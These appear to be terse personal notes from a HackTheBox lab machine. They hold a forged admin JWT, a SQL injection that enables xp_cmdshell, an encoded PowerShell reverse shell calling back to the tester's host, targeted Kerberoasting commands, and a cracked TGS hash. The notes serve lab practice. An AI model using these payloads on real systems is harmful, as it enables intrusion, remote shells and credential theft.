## Blazorized - Medium - Windows

-[+] : 	Target IP
   >>	10.10.11.22	
   
   
-[+] : 	
   >>		
-[+] : 	
   >>		
-[+] : 	
   >>		
-[+] : 	
   >>		
-[+] : 	
   >>		

  "superadmin@blazorized.htb",
## Recon
```nmap
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://blazorized.htb
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-29 20:25:20Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: blazorized.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1115.00; RC0+
| ms-sql-ntlm-info: 
|   10.10.11.22\BLAZORIZED: 
|     Target_Name: BLAZORIZED
|     NetBIOS_Domain_Name: BLAZORIZED
|     NetBIOS_Computer_Name: DC1
|     DNS_Domain_Name: blazorized.htb
|     DNS_Computer_Name: DC1.blazorized.htb
|     DNS_Tree_Name: blazorized.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2024-06-29T20:26:07+00:00; +2s from scanner time.
| ms-sql-info: 
|   10.10.11.22\BLAZORIZED: 
|     Instance name: BLAZORIZED
|     Version: 
|       name: Microsoft SQL Server 2022 RC0+
|       number: 16.00.1115.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RC0
|       Post-SP patches applied: true
|     TCP port: 1433
|_    Clustered: false
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-06-29T19:01:27
|_Not valid after:  2054-06-29T19:01:27
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: blazorized.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Aggressive OS guesses: Microsoft Windows Server 2019 (94%), Microsoft Windows Vista SP1 (92%), Microsoft Windows 10 1709 - 1909 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2016 (91%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (90%), Microsoft Windows 10 1703 (90%), Microsoft Windows Server 2008 SP2 (90%), Microsoft Windows 8 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| smb2-time: 
|   date: 2024-06-29T20:25:58
|_  start_date: N/A

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   196.02 ms 10.10.16.1 (10.10.16.1)
2   196.21 ms 10.10.11.22 (10.10.11.22)
```
##
api.blazorized.htb -> through check status request . Gives back an admin cookie && admin.blazorized.htb 

GET /_framework/blazor.boot.json HTTP/1.1
Host: blazorized.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://blazorized.htb/
authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJzdXBlcmFkbWluQGJsYXpvcml6ZWQuaHRiIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjpbIlBvc3RzX0dldF9BbGwiLCJDYXRlZ29yaWVzX0dldF9BbGwiXSwiZXhwIjoxNzIwMTQ5NjczLCJpc3MiOiJodHRwOi8vYXBpLmJsYXpvcml6ZWQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5ibGF6b3JpemVkLmh0YiJ9.lCwMWfhY8uI2xj1S-GppaS2Cts55R9E7PGQr5JGTbU5mDXKhTUbeiDu9mJGpSlwyJygzQOt8ftVsBxdXl-5atw
Origin: http://blazorized.htb
DNT: 1
Connection: close

authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJzdXBlcmFkbWluQGJsYXpvcml6ZWQuaHRiIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjpbIlBvc3RzX0dldF9BbGwiLCJDYXRlZ29yaWVzX0dldF9BbGwiXSwiZXhwIjoxNzIwMTUzODA0LCJpc3MiOiJodHRwOi8vYXBpLmJsYXpvcml6ZWQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5ibGF6b3JpemVkLmh0YiJ9.5U6wmvfQMKmSJk6NPX2VF75lgNYsmjTKSRQ_CqS6TSEe4MeSWY_y578M_TCXrtbETSL4tfoiof3nzNxV5lai5g

at first i thought I needed to craft jwt but in fact i cant just clean the request

GET /_framework/Blazorized.Shared.dll HTTP/1.1
Host: blazorized.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://blazorized.htb/
DNT: 1
Connection: close

eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJzdXBlcmFkbWluQGJsYXpvcml6ZWQuaHRiIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjpbIlN1cGVyX0FkbWluIl0sImV4cCI6MTgwMDAwMDAxMSwiaXNzIjoiaHR0cDovL2FwaS5ibGF6b3JpemVkLmh0YiIsImF1ZCI6Imh0dHA6Ly9hZG1pbi5ibGF6b3JpemVkLmh0YiJ9.PSFcFQyuHXlGo3cWIbz5PJIn6zuEUaczIH9ZkIZzhooX4HLDW2u6Tea60OIQi5wPLBvaiEO3vCRRiGavCWpi1A

test'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -

	test'; exec master..xp_cmdshell 'powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AOAAzACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==';-- -
 
 
 Set-DomainObject -Credential $Cred -Identity RSA_4810 -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
 
 Set-DomainObject -Identity RSA_4810 -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
 
 
New-ADComputer -Name "HackTheBoxMachine" -SamAccountName "HackTheBoxMachine" -Path "CN=Computers,DC=BLAZORIZED,DC=HTB" -AccountPassword (ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force) -PassThru

Set-ADAccountPassword -Identity "HackTheBoxMachine$" -NewPassword (ConvertTo-SecureString "NewPassword123!" -AsPlainText -Force)




--------------------------


PS C:\Temp> Set-DomainObject -Identity RSA_4810 -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
Set-DomainObject -Identity RSA_4810 -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}
PS C:\Temp> Get-DomainSPNTicket -SPN "nonexistent/BLAHBLAH"
Get-DomainSPNTicket -SPN "nonexistent/BLAHBLAH"


SamAccountName       : UNKNOWN
DistinguishedName    : UNKNOWN
ServicePrincipalName : nonexistent/BLAHBLAH
TicketByteHexStream  : 
Hash                 : $krb5tgs$23$*UNKNOWN$UNKNOWN$nonexistent/BLAHBLAH*$73BDB18191624577B221CCD13769B2C5$F035A9E1FF7E
                       152DD010CF39A549AD984ECD70AAB3B20BC0C69610E4F81F63F2A02A0F84C8DA8457060C0FF02088457640C22654EF3D
                       1BD1A2C35FF40EEF455F518825A21DD23876B3A8BF9A01472FB91480C706DDBDBF3266C4A48EE520FFFF53608EF54D19
                       1BF28474B8DB8CFADDB53381C549BD2E41E20555D125EFCD1D71B8AA7AB66A41B2CFB1C57175E994404366A74FF910BC
                       85D30962CC03C2419DB1B094EB06E2FDCB6C647121789D3079252B0D86C36294B557B5981E85D9C4ADEDC66CE4E5B230
                       9EE6A7FB67E128992412DA02D47B2AB7FD5CAA5D962B27C2F2BC72426941FF9A31D76FCC3A9A76680643DC81C692BAFA
                       B309F5470E8121ED023FEE24CFA8B6C0345BA1DA7AC5A289ABE4E01C124056E13E9B7034E0C841B30C36C9E2F90D4AD5
                       4AE6691D69B9485D0970A7B278B6E023388EA3EC9AE541E9A3215833AF4E5FC9AC66A715B74413DABA92290757AF8F6E
                       B3761AF52727FB92AB24F4EB03F3ECFA8D4114F6AEDA247E5F10D7917BC005ECC19496EFC5ECFB626921CE2BEF72CB81
                       F44FC0F8545AC51D6D21A2A0441B4E65FEDF7D044B955695190AA140EAA369CA5BC85CF5394125E02A5480A97EB407A4
                       16FA4794C077F1FF52B3CDC3403C9CCDDC831C777433963064289BB566C1A9D4440612EE27B412CB9D20F38E50E5924F
                       326D72E2E7DFAEEC47903B5BAC97FB09FF56A1DF99F465D8656C5623EF7E83F4131E19F25BBCB029FF2F4A20F55540B8
                       A7D3201F83547B2624910021B31AD7D789873F39CBB4B983032A2422D65E6C87404738264E2C3E9F2A778CAE26DB5A39
                       C420A214BEC9BC7F72777021A398AD81D7B6AEA86DD9A0F67EF0DC202D8E96C44F960B746C5777D8FEE5AF382464F350
                       9F2FCE337CF5000B687900364EB019752F08B82AEE9B827C41C51CD1D3CF419653CEEDE103FFD77DB871B74260B95091
                       D053DF1A6A774EF1AEB655FDAEFB6A9850B1D91D90FFA81F4DEE5FADAFF89F8DFCB3D520F473CB9F8C07AA31E29CCFD5
                       9B6B36C74BBBE9F7D586F562C40FE397DA9F1333D651A62785D9636FEAF02311E8084957696BD085BB28F6AB3D84C882
                       61DE9C7B210E6D412F1DD3EDDCD315CDF50C9212D83EE7B596DC05F4C2F4F868B0334F6B2966BE34EF25052F7BB0D72C
                       661A5EBDCF8068C35E3D24BC41391B5BAEF3F0B0808D70360F0EA9910E6FA0F46C27B51908FCD54D591036BF87C3AFAD
                       07559D1E56C96E34ADD3D3DF25C93A44B60EA15EE5EB48E1174F4FD5AA01D58CA8992AF96F27E96EF335AC48CBD52D45
                       17F8779541CE2ABA9B522CB1263D4525B492052AE7C42B6961571F5776FD93C4C1EBDF1ECE0A704EAA8F40F595B063A8
                       E9073388803D34FF0BF60EFD102B83AE36804084E1AD701399B7FD4E8B19F5AF27E8D6E893390F52A72924E3A69E22F9
                       81C8786DE06326CFB3CC54B903F71B8569A450A5B51182C358B7E9F0A48FBD41B23772D47BCA908FD12D5AFB31AB71AC
                       15F5FC6B97523E4F2A649EA0E807FF9EE416246979C4410B7C3A17D653AC127D8C0EDC89EB8FDC8B72D9CB76E473C1BB
                       484AB7757C69D49E6246EF4D6F83FB405CCA305B2A07BFA3645BAB45C1B24D7BFB36670221E7BCC14CC6C10571F78667
                       41044D37342246551354B4768E294DCF9F3795C83DA42F1A73FCD85F94C8808D33C475556016E77F0A0C44B26A5CF0BB
                       4CD3C4F99384B26B0720AADB9CAA5D2478BB0037CDDAFAAF881B127F797094ADDF0131E33EDF8D4C63EA4B11FCEAC50F
                       3D82



$krb5tgs$23$*UNKNOWN$UNKNOWN$nonexistent/BLAHBLAH*$73bdb18191624577b221ccd13769b2c5$f035a9e1ff7e152dd010cf39a549ad984ecd70aab3b20bc0c69610e4f81f63f2a02a0f84c8da8457060c0ff02088457640c22654ef3d1bd1a2c35ff40eef455f518825a21dd23876b3a8bf9a01472fb91480c706ddbdbf3266c4a48ee520ffff53608ef54d191bf28474b8db8cfaddb53381c549bd2e41e20555d125efcd1d71b8aa7ab66a41b2cfb1c57175e994404366a74ff910bc85d30962cc03c2419db1b094eb06e2fdcb6c647121789d3079252b0d86c36294b557b5981e85d9c4adedc66ce4e5b2309ee6a7fb67e128992412da02d47b2ab7fd5caa5d962b27c2f2bc72426941ff9a31d76fcc3a9a76680643dc81c692bafab309f5470e8121ed023fee24cfa8b6c0345ba1da7ac5a289abe4e01c124056e13e9b7034e0c841b30c36c9e2f90d4ad54ae6691d69b9485d0970a7b278b6e023388ea3ec9ae541e9a3215833af4e5fc9ac66a715b74413daba92290757af8f6eb3761af52727fb92ab24f4eb03f3ecfa8d4114f6aeda247e5f10d7917bc005ecc19496efc5ecfb626921ce2bef72cb81f44fc0f8545ac51d6d21a2a0441b4e65fedf7d044b955695190aa140eaa369ca5bc85cf5394125e02a5480a97eb407a416fa4794c077f1ff52b3cdc3403c9ccddc831c777433963064289bb566c1a9d4440612ee27b412cb9d20f38e50e5924f326d72e2e7dfaeec47903b5bac97fb09ff56a1df99f465d8656c5623ef7e83f4131e19f25bbcb029ff2f4a20f55540b8a7d3201f83547b2624910021b31ad7d789873f39cbb4b983032a2422d65e6c87404738264e2c3e9f2a778cae26db5a39c420a214bec9bc7f72777021a398ad81d7b6aea86dd9a0f67ef0dc202d8e96c44f960b746c5777d8fee5af382464f3509f2fce337cf5000b687900364eb019752f08b82aee9b827c41c51cd1d3cf419653ceede103ffd77db871b74260b95091d053df1a6a774ef1aeb655fdaefb6a9850b1d91d90ffa81f4dee5fadaff89f8dfcb3d520f473cb9f8c07aa31e29ccfd59b6b36c74bbbe9f7d586f562c40fe397da9f1333d651a62785d9636feaf02311e8084957696bd085bb28f6ab3d84c88261de9c7b210e6d412f1dd3eddcd315cdf50c9212d83ee7b596dc05f4c2f4f868b0334f6b2966be34ef25052f7bb0d72c661a5ebdcf8068c35e3d24bc41391b5baef3f0b0808d70360f0ea9910e6fa0f46c27b51908fcd54d591036bf87c3afad07559d1e56c96e34add3d3df25c93a44b60ea15ee5eb48e1174f4fd5aa01d58ca8992af96f27e96ef335ac48cbd52d4517f8779541ce2aba9b522cb1263d4525b492052ae7c42b6961571f5776fd93c4c1ebdf1ece0a704eaa8f40f595b063a8e9073388803d34ff0bf60efd102b83ae36804084e1ad701399b7fd4e8b19f5af27e8d6e893390f52a72924e3a69e22f981c8786de06326cfb3cc54b903f71b8569a450a5b51182c358b7e9f0a48fbd41b23772d47bca908fd12d5afb31ab71ac15f5fc6b97523e4f2a649ea0e807ff9ee416246979c4410b7c3a17d653ac127d8c0edc89eb8fdc8b72d9cb76e473c1bb484ab7757c69d49e6246ef4d6f83fb405cca305b2a07bfa3645bab45c1b24d7bfb36670221e7bcc14cc6c10571f7866741044d37342246551354b4768e294dcf9f3795c83da42f1a73fcd85f94c8808d33c475556016e77f0a0c44b26a5cf0bb4cd3c4f99384b26b0720aadb9caa5d2478bb0037cddafaaf881b127f797094addf0131e33edf8d4c63ea4b11fceac50f3d82:(Ni7856Do9854Ki05Ng0005 #)




